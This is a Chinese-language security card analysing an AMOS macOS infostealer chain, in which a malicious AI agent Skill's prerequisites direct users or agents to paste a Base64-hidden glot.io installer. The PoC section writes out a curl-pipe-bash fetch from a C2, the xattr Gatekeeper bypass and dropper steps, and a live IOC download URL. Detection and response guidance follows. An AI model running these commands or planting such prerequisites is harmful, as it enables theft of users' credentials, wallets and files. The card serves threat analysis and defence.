---
id: ai-security-supply-chain-amos-macos-stealer-glotio-gatekeeper-bypass
title: 假 Setup-Wizard 经 glot.io 投递 AMOS：Base64 安装脚本 + xattr 绕过 Gatekeeper
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: amos-macos-stealer-glotio-dropper
aliases:
- AMOS 窃密木马
- glot.io 投递
- Setup-Wizard
- xattr 绕过 Gatekeeper
- macOS infostealer
- Atomic macOS Stealer
tags:
- ai-supply-chain
- macos
- amos
- infostealer
- glotio
- gatekeeper
- dropper
- agent-skill
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V107
  verified_at: '2026-11-05T22:45:43+08:00'
  notes: 已对照原文与全部 44 张本地图片（另有 1 张 xz.aliyun.com 远程图无法读取）核对：PoC、截图、命令、IOC、检测规则与数字均与原文一致。未验证点：原文部分攻击链为描述/示意，未提供完整可运行样本；本库未复跑任何 PoC；frontmatter 无 sources/source_url。
---

## 一句话结论

恶意 Skill 的 Prerequisites 指向 glot.io 上的“Setup-Wizard”脚本；脚本用 Base64 隐藏下载命令，从 C2 拉取二阶段 Dropper，Dropper 用 `xattr -d com.apple.quarantine` 移除 Gatekeeper 隔离属性、`chmod +x` 赋执行权限后运行 AMOS 窃密载荷，递归复制用户目录并外传。

## 原理

- **借合法粘贴站投递**：glot.io 是正常代码分享站，域名信誉好、内容可随时修改；SKILL.md 让用户/Agent “复制安装脚本到终端执行”，扫描器只看到一段普通安装说明，恶意脚本不在 Skill 包内。
- **Layer 1 安装脚本**：外观是 `Setup-Wizard` 引导，实际用 `echo '<base64>' | base64 -d | bash` 隐藏下载/执行命令；Base64 让静态内容特征失效。
- **Layer 2 Dropper**：下载真正的载荷到临时路径，执行 `xattr -d com.apple.quarantine` 移除 macOS 隔离属性，再 `chmod +x` 赋权并运行，从而绕过 Gatekeeper 对未签名/未公证二进制的拦截。
- **Layer 3 窃密载荷**：AMOS 类木马用 `fork` 创建子进程后台执行、`setsid` 脱离终端、`popen`/`system` 执行 Shell 命令外泄、`getenv` 读取环境变量、`fopen`/`fread`/`fwrite` 递归复制/读取文件（浏览器、钱包、钥匙串相关数据）。
- **静态不可见**：示例二进制 521KB 但只有 17 个可读字符串，路径/API/C2 等均在运行时动态解密；字符串密度极低是强异常信号，但扫描器通常只看字符串命中。
- **为什么危险**：用户在“安装 AI Skill 前置依赖”的语境下主动粘贴命令，绕过了包管理器/市场审核；macOS 用户对 `xattr` 与 `chmod` 的安全含义不敏感，且窃密进程会主动脱离终端。

## 触发条件

- 受害者为 macOS，按恶意 Skill 的 Prerequisites 访问 glot.io/粘贴站并执行脚本。
- 系统允许终端执行 `curl`、`base64`、`xattr`、`chmod`；Gatekeeper 仅依赖 quarantine 属性，未启用 MDM/EDR 强制策略。
- 载荷可从 C2 下载，且未被网络白名单/代理拦截。
- 用户未审查脚本内容；终端未被限制访问敏感目录。
- 攻击者能持续维护 glot.io 页面/C2（内容可随时替换）。

## 利用步骤

1. 在恶意 Skill 的 `SKILL.md` 中写 Prerequisites：Windows 指向带密码 ZIP，macOS 指向 glot.io 的“安装脚本”页面，要求复制到终端执行。
2. 在 glot.io 放置 Layer 1 脚本：打印 `Setup-Wizard` 字样，`echo '<base64>' | base64 -d | bash`。
3. Layer 1 解码后从 C2 下载 Dropper 到临时目录。
4. Dropper 执行 `xattr -d com.apple.quarantine <payload>` 移除隔离属性，`chmod +x` 后运行。
5. 窃密载荷 `fork`/`setsid` 脱离终端，用 `popen`/`system` 调用 curl 等外传，递归复制用户目录中的浏览器/钱包/凭据数据。
6. 变体：用 gist/rentry/pastebin/Notion 页面替代 glot.io；用 AppleScript 弹窗伪装“安装需要权限”；把脚本藏在图片/文档中。

## PoC

Layer 1（外观与结构示意，C2 脱敏）：

```bash
echo "Setup-Wizard: https://install.app-distribution.net/setup/" && \
echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzxDMj4vPHBheWxvYWQ+KSI=' | base64 -d | bash
```

Base64 解码后的等价命令：

```bash
/bin/bash -c "$(curl -fsSL http://<C2>/<payload>)"
```

Layer 2 Dropper：

```bash
curl -fsSL http://<C2>/<payload> -o /tmp/.upd
xattr -d com.apple.quarantine /tmp/.upd
chmod +x /tmp/.upd
/tmp/.upd
```

Layer 3 行为特征（原文符号）：

```text
_fork   创建子进程后台执行
_setsid 脱离终端会话
_popen  执行 Shell 命令外泄
_system 执行 Shell 命令
_getenv 读取环境变量
_fopen/_fread/_fwrite 文件读写与递归复制
```

示例 IOC：下载 URL `http://91.92.242.30/7buu24ly8m1tn8m4`（原文样本，分析用，不执行）。

## 变体与关联

- **投递变体**：glot.io/gist/pastebin/rentry、伪造安装页、带密码 ZIP、AppleScript 弹窗、DMG/PKG 伪装。
- **Gatekeeper 绕过变体**：`xattr -d com.apple.quarantine`、右键打开、`spctl --master-disable`、公证滥用、签名白加黑。
- **载荷变体**：AMOS/Atomic Stealer、Keychain 抓取、浏览器 Cookie/密码、钱包私钥、剪贴板替换。
- **关联卡片**：[[ai-security-supply-chain-doubao-claw-fake-skill-setup-js-remcos]]（恶意 Skill 安装链）、[[ai-security-supply-chain-skill-package-scan-evasion-zip-padding]]（加密 ZIP 投递）、[[ai-security-supply-chain-server-driven-decode-chain]]（Base64/编码链隐藏）。
- **边界**：macOS 仍可能对未公证二进制弹窗拦截；`xattr` 需要文件存在且用户有权限；MDM/EDR 可阻断；C2 下线会使链失效。原文未给出完整 AMOS 配置，部分行为来自符号/系统调用观察。

## 检测与防御

- **主机检测**：监控 `xattr -d com.apple.quarantine`、临时目录 `chmod +x`、从 `/tmp` 运行未签名二进制、`setsid`/`fork` 后紧接 `curl`/`popen`；监控终端访问浏览器/钱包/钥匙串目录。
- **网络检测**：封禁示例 C2 `91.92.242.30` 与 `install.app-distribution.net` 等可疑下载域；监控终端/安装器进程访问粘贴站与陌生域名；对 Base64 长串 + `base64 -d | bash` 模式告警。
- **静态检测**：Skill 的 Prerequisites 中出现 glot.io/pastebin/gist/“复制到终端”话术直接高危；包内二进制字符串密度低（521KB/17 串）加分；YARA 匹配 `xattr -d com.apple.quarantine`、`base64 -d | bash`、`Setup-Wizard`。
- **防御**：不要粘贴 Skill 提供的安装命令；启用 Gatekeeper/公证与 MDM；限制终端完全磁盘访问；使用 EDR 监控 `xattr`/`chmod`/临时目录执行；Agent 不应自动执行 Prerequisites 中的 Shell 命令。
- **响应**：断网、终止可疑进程、轮换浏览器/钱包/云凭据、检查钥匙串与持久化项、删除临时载荷并回溯 glot.io 页面修改历史。
